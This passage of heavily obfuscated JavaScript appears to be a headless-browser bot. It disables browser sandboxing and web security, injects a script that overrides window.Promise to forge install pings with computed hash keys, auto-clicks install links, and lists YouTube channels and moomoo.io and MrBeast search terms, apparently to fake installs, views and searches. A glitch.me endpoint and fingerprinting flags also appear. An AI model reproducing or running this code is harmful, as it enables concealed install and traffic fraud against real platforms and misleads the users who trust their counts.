                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb68 + -0x1 * 0x1736 + -0x3f1 * -0x3 | L >>> -0x1d * 0x11d + -0x1cf3 + 0x3d57) + (M & N | ~M & O) + P + (0x3e863e37 + 0x9c42fa3d + -0x8046bedb) + Q[J] << -0xf * 0x135 + -0x59e * 0x1 + 0x17b9) << 0x1e9a + -0x6f5 * -0x3 + -0xcdd * 0x4 | P >>> -0xa27 * -0x2 + 0x1d * -0x96 + 0x335 * -0x1) + (L & (M = M << 0x7 * -0x27 + -0x1e9d + 0x37 * 0x94 | M >>> -0x2032 + 0x1 * 0x50 + 0x34 * 0x9d) | ~L & N) + O + (0x62483dca + 0x99714062 + -0xa1370493) + Q[J + (-0x2123 + -0x1f0f * 0x1 + 0x13 * 0x361)] << 0x27 * 0xc5 + 0xee0 * -0x1 + -0x7d * 0x1f) << -0x1 * -0x1f49 + 0x22f * 0x3 + -0x3 * 0xc9b | O >>> 0x1c0c + -0x209 * -0x11 + -0x641 * 0xa) + (P & (L = L << -0x1139 * -0x1 + 0x2 * -0x4a + -0x1 * 0x1087 | L >>> 0x20de + -0xbd8 + 0x5 * -0x434) | ~P & M) + N + (0x4c5067c + -0x5e * -0x2c26af + 0x6005 * 0xb95f) + Q[J + (-0x1aa1 * 0x1 + 0x4c3 * -0x1 + 0x1f66)] << 0x2389 + -0x1 * -0x1e5c + -0x3 * 0x15f7) << 0x36b * 0x4 + 0x1145 * -0x1 + 0x1cf * 0x2 | N >>> 0x1 * -0xc8c + 0x618 + 0x68f * 0x1) + (O & (P = P << 0x3 * 0x3d3 + 0x2a4 + -0xdff * 0x1 | P >>> 0x226c + -0xa36 + -0x1834) | ~O & L) + M + (-0xa4c5943f * 0x1 + -0x47ed * 0x1defd + -0x4c61 * -0x51ab1) + Q[J + (-0x11eb + 0x1f * -0x92 + 0x239c)] << -0x1bc9 + 0x6 * -0x386 + 0x3 * 0x104f) << 0x369 + 0xc25 * -0x3 + 0x210b | M >>> -0x83 * 0x4a + -0x8a5 + 0x36 * 0xdd) + (N & (O = O << -0x2088 + -0x3b9 + 0x245f | O >>> 0x14b7 + -0x1f9 + -0x4af * 0x4) | ~N & P) + L + (-0x3d1e9ede + 0x47288 * -0x138e + 0xee98b7e7) + Q[J + (0x1cc9 + -0x1 * 0x14ba + 0x47 * -0x1d)] << -0x94c + 0x2 * -0x1e9 + 0x92 * 0x17, N = N << 0x1e4f * 0x1 + 0x3a7 + -0xb48 * 0x3 | N >>> -0x1e6a + 0xa21 + -0x1 * -0x144b;
              for (; J < -0x1a17 + 0x794 + -0x3 * -0x639; J += -0x6f3 * -0x5 + 0x15d3 + -0x388d * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1aff + -0x2 * -0x1075 + 0x12e * -0x5 | L >>> -0x1 * -0x1b47 + 0x1df * -0x1 + 0x11 * -0x17d) + (M ^ N ^ O) + P + (-0x1e0b * 0x5a9f9 + -0x1 * 0x8b21579d + 0x1a424bef1) + Q[J] << 0x1 * -0x177b + 0x235 * -0x8 + 0x2923) << -0xb95 + -0x548 + 0x2 * 0x871 | P >>> 0x1098 + 0xf7f + -0x1ffc) + (L ^ (M = M << 0x1397 * -0x1 + 0xd1f + 0x2 * 0x34b | M >>> 0x12e9 + -0x1 * -0x20b5 + 0xce7 * -0x4) ^ N) + O + (-0x2 * -0x5d12fcbf + -0x98620a78 + -0x701ffb1 * -0xb) + Q[J + (0xe8 * 0x1f + -0x173 * -0x2 + 0x1 * -0x1efd)] << -0x148a + -0x3a8 + 0x1832) << -0x1 * -0x2f5 + -0x152 * -0xd + -0x1f * 0xa6 | O >>> -0x1c0c + 0x1153 + 0x2b5 * 0x4) + (P ^ (L = L << -0x9 * -0x455 + 0xf79 + 0x178 * -0x25 | L >>> 0x735 + 0x10 * 0xfb + -0x16e3) ^ M) + N + (0x233fe * 0x4dea + 0xa9eb6d53 + -0xe6b86dde) + Q[J + (-0x1 * -0x195d + 0x24b9 + -0x3e14)] << -0x2267 + 0x1169 + 0x96 * 0x1d) << -0x2016 + 0x8 * 0x49a + 0x5 * -0xf1 | N >>> -0x1 * -0xbc0 + -0xc * -0x243 + -0x26c9) + (O ^ (P = P << -0x19 * 0xcd + 0xcbd + 0x1 * 0x766 | P >>> -0x442 + -0x11 * 0x10 + -0x155 * -0x4) ^ L) + M + (0x973bb587 + 0x16279c34 + 0x111 * -0x3aa47a) + Q[J + (0x1d67 + -0x3 * -0x947 + 0x3 * -0x1313)] << -0x2381 * -0x1 + 0x3 * -0xb9e + -0x1 * 0xa7) << 0x14 * -0x6a + 0x1 * 0x40d + 0x1 * 0x440 | M >>> -0x49f + -0x3b * 0x55 + -0x1851 * -0x1) + (N ^ (O = O << 0x22e9 + 0xd * -0x1c4 + -0xbd7 | O >>> -0x1bd6 + -0xc7 + 0x1c9f) ^ P) + L + (0x1c09 * 0x25c06 + -0x7 * 0xc58bd5 + 0x321ada3e) + Q[J + (0x29 * 0x16 + 0x317 + -0x699)] << 0xf91 + -0x127b + 0x175 * 0x2, N = N << -0x1963 + -0x2636 + 0x3fb7 | N >>> -0x1395 + -0xa2b + -0x1 * -0x1dc2;
              for (; J < 0x2610 + -0x8f8 + -0x1cdc; J += 0x536 + -0x4a3 * 0x2 + 0x415)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x290 * -0x5 + -0x26f1 + 0x1a26 | L >>> -0x1 * -0x961 + -0x198f + 0x1049) + (M & N | M & O | N & O) + P - (0xd5be4925 + -0x88019b03 + 0x23279502) + Q[J] << -0xc21 + 0x1ca9 + -0xb8 * 0x17) << -0x2074 + -0xffb + 0x3074 | P >>> -0xad * -0x5 + 0xe67 + -0x11ad * 0x1) + (L & (M = M << 0x18 * 0x1 + 0x2556 + -0x4aa * 0x8 | M >>> 0x1d * -0x119 + 0x1a7d + 0x55a) | L & N | M & N) + O - (-0x1b8add * 0x9f + -0x8 * 0x64a988d + 0xb45446cf) + Q[J + (-0x757 * 0x2 + 0x4ae + 0xa01)] << -0x92 + -0x581 * -0x2 + -0xa70) << -0x104 * 0x13 + 0x1 * 0x24e7 + 0x1 * -0x1196 | O >>> -0x11f5 * -0x2 + 0x1f95 + -0x4364) + (P & (L = L << 0x3c5 * -0x1 + 0x1dff + -0x1a1c | L >>> 0x25b3 + 0x184b + -0x3dfc) | P & M | L & M) + N - (0x4ad3ef75 + -0x54379a7 + 0x2b53cd56) + Q[J + (0x109e + -0x5f * -0x23 + 0x1d99 * -0x1)] << -0x389 * 0x1 + 0x11 * 0xc9 + -0x9d0) << -0xde1 + -0x9af + 0x1 * 0x1795 | N >>> 0x3a * 0x64 + 0x9 * -0x12 + -0xb5 * 0x1f) + (O & (P = P << -0x1131 + 0x1 * -0x1ed3 + 0x3022 | P >>> 0x406 + -0x18e2 + 0x14de) | O & L | P & L) + M - (-0x1f9e089b * 0x3 + 0x53 * 0xd5fa8b + 0x8a5e21e4) + Q[J + (-0x59 * 0x50 + -0x1c1 * 0xa + -0xed * -0x31)] << 0x32 + 0xb0f + -0xb41) << -0x42a + 0x2 * -0x274 + 0x917 | M >>> 0x16e9 + 0x7f8 + -0x3 * 0xa42) + (N & (O = O << -0x264a + -0x872 + -0x7cf * -0x6 | O >>> -0x71f * -0x3 + -0x1786 + 0x22b) | N & P | O & P) + L - (0xb929aabc + -0x1 * -0x574d5a3e + -0x9f92c1d6) + Q[J + (-0x2354 * -0x1 + -0x243a + 0x1 * 0xea)] << 0x1e42 + 0xad * 0x4 + -0x20f6, N = N << -0x1 * -0x156b + 0x10b1 * 0x1 + 0x25fe * -0x1 | N >>> 0x344 + -0x2557 + 0x2215;
              for (; J < -0x1cf * 0x11 + -0x1 * -0x1096 + 0x2e5 * 0x5; J += 0x26b3 + 0xc4f + 0x32fd * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc1 * 0x1f + 0x1f5a + -0x7f6 | L >>> -0x1741 + 0x1 * -0xc31 + 0x238d) + (M ^ N ^ O) + P - (-0x1ba91cd5 * 0x1 + 0x253 * 0x1bdf7f + 0x1 * 0x107de6d2) + Q[J] << 0x316 * 0x2 + -0x2219 + 0x94f * 0x3) << 0xd33 + 0x3a * -0xa1 + 0x174c | P >>> 0xd0 * 0x1d + -0x1 * -0x212d + -0x38a2) + (L ^ (M = M << -0x23c * 0x7 + 0x19b6 * 0x1 + -0x5b * 0x1c | M >>> 0x1569 + -0xe94 + -0x6d3) ^ N) + O - (-0x1 * 0x69763996 + -0x42d05b1e + 0xe1e3d2de) + Q[J + (-0x1b9d + -0x137 * 0x6 + 0x22e8)] << -0x1 * 0x15a9 + -0x4 * -0x8f + 0x136d) << 0x2 * 0x7 + -0x526 + 0x51d | O >>> -0x264d + 0xb * 0x314 + 0x1 * 0x48c) + (P ^ (L = L << -0xd8b + -0x1586 + 0x232f | L >>> 0xe06 + 0x61 * 0x44 + -0x27c8) ^ M) + N - (0x62bc9f30 + 0x651a3959 + -0x92399a5f) + Q[J + (0x9d6 + 0x1087 + 0x1a5b * -0x1)] << -0x2 * 0x6ee + -0xe8a * -0x2 + -0x1e7 * 0x8) << -0x1433 + -0xe7e * 0x2 + 0xc4d * 0x4 | N >>> 0xe54 + 0x6ea + -0x1523) + (O ^ (P = P << 0x2 * -0x7f9 + 0x6ab + 0x965 | P >>> -0xa * 0x2f9 + 0x1 * 0xb23 + 0x1299) ^ L) + M - (-0x281501b8 + 0x15a * -0x1dcb90 + 0x85f76082) + Q[J + (-0x1aa3 + 0x49 * 0x6a + -0x394)] << -0x1fe1 + -0x183f + 0x3820) << 0x1ece + 0x1 * -0x1b5e + -0x36b | M >>> 0x1 * 0x193 + -0x1 * 0x250b + 0x2393) + (N ^ (O = O << -0x1 * -0x21db + -0xe17 + -0x13a6 | O >>> -0x240 + -0x4a4 * 0x4 + 0x14d2) ^ P) + L - (-0x2abff * 0x27e8 + 0x4fdb7e6d + 0x506177d5) + Q[J + (0x11 * -0x22f + -0x735 * -0x2 + 0x1 * 0x16b9)] << 0x20be + 0x1b6c + -0x22 * 0x1c5, N = N << -0x1469 + -0x23c9 + 0x3850 | N >>> 0x1 * -0x213d + 0x2 * -0xec2 + 0x3ec3;
              this['h0'] = this['h0'] + L << 0x25be + 0x1 * -0xb06 + -0x1ab8, this['h1'] = this['h1'] + M << -0x1298 + 0xede + 0x3ba, this['h2'] = this['h2'] + N << 0x241f + 0x259f + -0x49be * 0x1, this['h3'] = this['h3'] + O << -0x20ee + 0x581 + 0x1b6d, this['h4'] = this['h4'] + P << 0x1fbb + -0x3a9 * -0x8 + 0x1 * -0x3d03;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2121 + 0x27 * 0x9a + 0x9c7 & 0x1513 + 0x2 * -0xef3 + 0x8e2] + w[J >> -0x2 * 0x9a7 + 0xa1 + 0x5 * 0x3c1 & -0x1997 + 0x1 * 0x1cc9 + -0x323] + w[J >> 0x25e8 + -0x5ed + -0x1fe7 & -0x1a5d + 0x1 * -0x1e9d + 0x3909] + w[J >> -0xd5a * 0x1 + 0x2 * 0xd04 + -0x22 * 0x5f & 0xd3f + 0xa * 0x3e2 + -0x1 * 0x3404] + w[J >> 0xee4 + -0x33d * -0x5 + 0x5 * -0x635 & -0x7 * 0x572 + 0x25b * 0xb + 0xc44] + w[J >> 0x128e + -0xe8b + -0x3fb & -0x1bd0 + -0xce0 + -0xab * -0x3d] + w[J >> -0xef4 + -0x1 * -0x757 + 0x7a1 & 0x2505 + -0x1 * 0x20dd + -0x419 * 0x1] + w[-0xb68 * 0x1 + -0xdd7 + 0x194e & J] + w[K >> -0x1 * 0x24cc + -0xc77 * 0x2 + 0x3dd6 & 0xec9 + 0x890 + -0x174a] + w[K >> 0x236f + -0x5c2 + -0x1 * 0x1d95 & -0x1 * -0x2327 + -0xa7f + -0x1899] + w[K >> -0x16f * -0x13 + -0x1847 + -0x12 * 0x29 & 0x5 * 0x10b + -0x21a4 + -0xe3e * -0x2] + w[K >> 0x18ee + -0x1fb6 + 0x248 * 0x3 & -0x6b1 + -0x1 * -0x667 + 0x59] + w[K >> -0x20c7 + -0x21ab + 0x427e & -0x14b * -0x11 + -0x1 * 0x224c + -0x1 * -0xc60] + w[K >> -0x1b * -0x11f + -0x425 * -0x5 + 0x4a2 * -0xb & -0x13ea + 0x1a40 + -0x1 * 0x647] + w[K >> 0x229b + 0x18c6 + -0x491 * 0xd & -0x1cf4 + 0x1 * 0x874 + 0x115 * 0x13] + w[0xf5f + -0x19 * -0xc1 + -0x2229 & K] + w[L >> 0x6df * 0x2 + 0x19 * -0x12e + -0xfdc * -0x1 & -0x9 * 0x3ad + -0xa69 + 0x2b8d] + w[L >> 0x80d + -0x8d1 + 0x2 * 0x6e & 0xd * -0x1e7 + -0xa33 * -0x2 + 0x464] + w[L >> -0x12d6 + 0x1687 * -0x1 + 0x2971 & -0x9fd + 0x2 * 0xc79 + -0xee6] + w[L >> 0xf02 + 0xc * -0x23f + 0x35 * 0x3a & 0xfe2 * 0x2 + -0x14b * -0x1a + 0x4153 * -0x1] + w[L >> 0x1f0a + 0x42 * -0x52 + -0x9da & 0x170c + 0x1 * -0x5d2 + -0x125 * 0xf] + w[L >> 0x1a8a + 0xef0 + -0x1 * 0x2972 & 0x1c4b * 0x1 + 0xb8a + 0x3 * -0xd42] + w[L >> -0xdf2 + -0x26ff + 0x34f5 & -0x15bd + -0x1c8d * 0x1 + 0x1 * 0x3259] + w[0xbfb * 0x2 + -0x2511 + -0x5 * -0x2a2 & L] + w[M >> 0x1 * -0xf26 + -0x1 * 0x193b + -0x1 * -0x287d & 0x238c + -0x64 * 0x9 + -0x1ff9] + w[M >> -0x1740 + -0x1 * -0x229d + -0xb45 & -0x2 + 0x59b * 0x5 + 0x2 * -0xdfb] + w[M >> -0x4c4 * -0x8 + 0x18df + -0x3eeb & 0x24cc + -0x2250 + -0x26d] + w[M >> -0x2c * -0x71 + 0x1 * -0x13f1 + 0x1 * 0x95 & 0x373 * 0x7 + -0x1196 + 0x1a * -0x40] + w[M >> 0x2398 + -0x24d3 + -0x6d * -0x3 & 0x115 * 0xa + 0x2397 + -0x2 * 0x172d] + w[M >> -0x1f9a + -0x46c * -0x2 + 0x16ca * 0x1 & 0x1 * 0x220 + -0x143b * -0x1 + 0xb26 * -0x2] + w[M >> -0x67 * -0x60 + -0x1 * -0x1b61 + -0x41fd & 0x1b4b * -0x1 + 0x11 * -0xce + -0x34 * -0xca] + w[-0x1c7d + 0x118d + 0xaff & M] + w[N >> -0x925 + -0x16a6 + -0x1 * -0x1fe7 & -0x1cb1 + 0x511 + 0x17af] + w[N >> -0x5e5 + -0x173 * 0x7 + -0x46 * -0x3b & -0x7 * -0x4a5 + 0x2197 + -0x420b] + w[N >> 0x597 + 0x22cd + 0xd7 * -0x30 & 0x67c * 0x1 + -0x1 * 0x8eb + 0x27e] + w[N >> -0x1 * -0xdd5 + -0x3 * -0x44f + 0x11 * -0x192 & 0x15 * -0x102 + 0x1 * 0x9f5 + -0x67 * -0x1c] + w[N >> -0x1 * 0x1334 + 0x250 + 0x10f0 & -0x59 * -0x4 + -0x93f + -0x2 * -0x3f5] + w[N >> -0x230d * 0x1 + -0x1d47 + 0x55d * 0xc & -0x125e + -0xa6a + 0x6b * 0x45] + w[N >> 0x1 * 0xbf5 + -0x23cd + 0x17dc & 0xb15 * 0x2 + 0x1483 + -0x2a9e] + w[-0x120 * -0x1e + 0x7 * -0x21e + 0x12df * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x625 + 0xd1f * 0x2 + -0x6ab * 0x3 & 0x8d1 + -0x156f + 0xd9d,
                J >> -0x13f9 + 0x94b + 0x19 * 0x6e & 0x1 * 0xc77 + -0x95 * -0x1 + -0xc0d * 0x1,
                J >> 0x45 * -0x7b + 0x47 * -0x55 + 0x38c2 & 0x1ccb + 0x1aca + 0x2 * -0x1b4b,
                -0xa * -0x20f + 0x367 * 0x5 + -0x249a & J,
                K >> 0x17 * 0x73 + 0x11 * -0x1af + -0xd * -0x16a & 0x1b7 * 0x8 + 0x894 * 0x3 + -0x37 * 0xb3,
                K >> 0xf2b * -0x1 + -0xb3 * 0x27 + 0x2a80 & -0x2 * -0x220 + -0x2 * -0x10be + 0xb * -0x357,
                K >> 0x1c42 + 0x2342 + -0x3f7c & 0x2226 + 0xb3c + -0x2c63,
                0x155 * -0x1 + -0x4b8 * -0x6 + -0x19fc & K,
                L >> 0x13c6 + 0x26b9 + -0x3a67 & -0x45 * 0x2b + -0x766 * 0x3 + 0x22c8,
                L >> 0x1 * 0x31a + 0x8ec + -0xbf6 & -0x2440 + -0xf5d + 0xb6 * 0x4a,
                L >> -0x3aa * -0x4 + -0x143 + -0xd5d & -0x2564 + 0x1535 + 0x2 * 0x897,
                -0x1871 + 0x1 * -0x2c1 + -0x7 * -0x407 & L,
                M >> 0x3b9 + 0x13f9 * -0x1 + 0x1058 & 0x23b * -0xb + -0x89d + -0x2225 * -0x1,
                M >> 0xeb * 0x7 + 0xd * -0x155 + -0x2 * -0x57a & 0x112e * 0x2 + -0xc20 + -0x153d,
                M >> 0x12e * 0x17 + -0x33b * 0x4 + 0x16b * -0xa & 0x2 * 0x853 + -0x9 * 0x2a3 + 0x2c * 0x2f,
                -0x94a + 0xa6 * -0x17 + 0x1933 & M,
                N >> -0xf71 + -0x26 * -0xc0 + 0x1 * -0xcf7 & 0x243 * 0x2 + 0xe50 + 0x1 * -0x11d7,
                N >> 0x6f3 * -0x1 + -0x2296 + 0x2999 & -0x2 * -0xbce + 0x23b4 + -0x3a51,
                N >> -0xbf2 * 0x2 + 0x28 * 0xd7 + -0x1 * 0x9ac & 0x192b + -0x52f * 0x3 + 0x1 * -0x89f,
                0x2026 + -0x1320 + -0xc07 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x11b3 + 0x84c + -0x19eb), (K = new DataView(J))['setUint32'](0x20f7 + 0xb * -0x337 + 0x266, this['h0']), K['setUint32'](0xb7b + 0x21 * 0x79 + -0x8 * 0x362, this['h1']), K['setUint32'](0x67 * 0x53 + 0x260b + -0xa * 0x724, this['h2']), K['setUint32'](0x2c + 0x1 * -0x4ef + 0x4cf, this['h3']), K['setUint32'](-0x739 * 0x1 + 0x2058 + -0x190f * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2 * -0xfc4 + -0x48f * 0x1 + 0x2417];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x3cd * -0x1 + 0x1 * 0x41b + -0x4e;
            J[0x693 + -0x15 * 0x1c7 + 0x1ec0]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * -0xe4f + -0x3 * 0x20e + 0x3 * 0x6d3] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x14a2 + 0x1 * -0x16f7 + 0x1a * 0x17), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xcf7 * -0x3 + -0x1 * -0x5cb + -0x2caf;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1c89 + -0x52f * 0x4 + -0x1 * 0x1f1), Promise['resolve'](0xc10 + 0x12f * 0x17 + -0x2748);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0xfa7 + -0x58b * -0x1 + 0x287 * 0x4; j < -0x1 * -0x2287 + -0x13b2 + -0xed4; j++)
    i();
}
const NETWORK_PATIENCE = -0x24fa + -0x1 * 0x340f + -0x35 * -0x245 + (0x7 * -0x2b4 + 0x980 + 0x1524) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x8b0 * -0x1 + -0x15ed * 0x1 + 0xe0 * 0x23) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * 0x2324 + -0x45 * -0x6b + 0x64d * 0x1);
    let h = e[f];
    if (b['bmFhpu'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xa25 + 0x1f45 + -0x1 * 0x296a, s, t, u = 0x2 * -0x57f + -0x1357 * 0x1 + 0x1e55; t = n['charAt'](u++); ~t && (s = r % (-0xc8c + 0xb8e + -0x2b * -0x6) ? s * (0x7a * 0x25 + 0x4fd * 0x4 + -0x2556) + t : t, r++ % (-0x3 * 0x8f9 + 0x1e18 + -0x329)) ? p += String['fromCharCode'](-0x1 * -0x2579 + 0x1 * 0x20dd + -0x4557 & s >> (-(-0xe9b * -0x1 + -0xcbf + -0x1 * 0x1da) * r & -0x1afb + 0x1003 * -0x2 + 0x3b07)) : 0x121e + 0x9 * 0x125 + -0x1c6b) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1c * -0x5c + 0xcf9 + -0x2e9 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2027 + -0x1b9b + 0x3bd2))['slice'](-(0x755 * -0x5 + 0x1b78 + 0x933));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * 0xb7d + -0x29 * 0x95 + 0x235a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x7fb + 0x95 + -0x890; u < -0x1 * 0xf39 + 0xf3a + 0xff; u++) {
          p[u] = u;
        }
        for (u = -0x2408 * 0x1 + -0x77 * -0x52 + 0x10b * -0x2; u < 0x81b + -0x2 * -0xffb + 0x89 * -0x49; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xa03 * 0x2 + -0xd19 + -0x5 * -0x6d3), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1da6 + -0x1aa8 + 0x17f * -0x2, q = 0x6 * 0xc5 + 0x1e21 + -0x22bf;
        for (let v = -0x3b9 + -0x146f + -0x2 * -0xc14; v < n['length']; v++) {
          u = (u + (-0xec * -0x11 + 0x2 * -0x9c6 + 0x3e1)) % (-0x14fd + -0x15a0 + 0x2b9d), q = (q + p[u]) % (0x24a8 + 0xb6f * 0x2 + -0x3a86), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x2052 + -0x199 * 0x6 + -0x2 * 0xade)]);
        }
        return t;
      };
      b['YFsXHz'] = m, c = arguments, b['bmFhpu'] = !![];
    }
    const j = e[0x1765 + -0x2175 + 0xa10],
      k = f + j,
      l = c[k];
    return !l ? (b['VfBytq'] === undefined && (b['VfBytq'] = !![]), h = b['YFsXHz'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * 0x2324 + -0x45 * -0x6b + 0x64d * 0x1);
    let h = e[f];
    if (c['toDZaW'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xa25 + 0x1f45 + -0x1 * 0x296a, r, s, t = 0x2 * -0x57f + -0x1357 * 0x1 + 0x1e55; s = m['charAt'](t++); ~s && (r = q % (-0xc8c + 0xb8e + -0x2b * -0x6) ? r * (0x7a * 0x25 + 0x4fd * 0x4 + -0x2556) + s : s, q++ % (-0x3 * 0x8f9 + 0x1e18 + -0x329)) ? o += String['fromCharCode'](-0x1 * -0x2579 + 0x1 * 0x20dd + -0x4557 & r >> (-(-0xe9b * -0x1 + -0xcbf + -0x1 * 0x1da) * q & -0x1afb + 0x1003 * -0x2 + 0x3b07)) : 0x121e + 0x9 * 0x125 + -0x1c6b) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1c * -0x5c + 0xcf9 + -0x2e9 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2027 + -0x1b9b + 0x3bd2))['slice'](-(0x755 * -0x5 + 0x1b78 + 0x933));
        }
        return decodeURIComponent(p);
      };
      c['lhLYNO'] = i, b = arguments, c['toDZaW'] = !![];
    }
    const j = e[-0x1 * 0xb7d + -0x29 * 0x95 + 0x235a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['lhLYNO'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1 * 0x240b + -0xd5b + 0x3166; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' 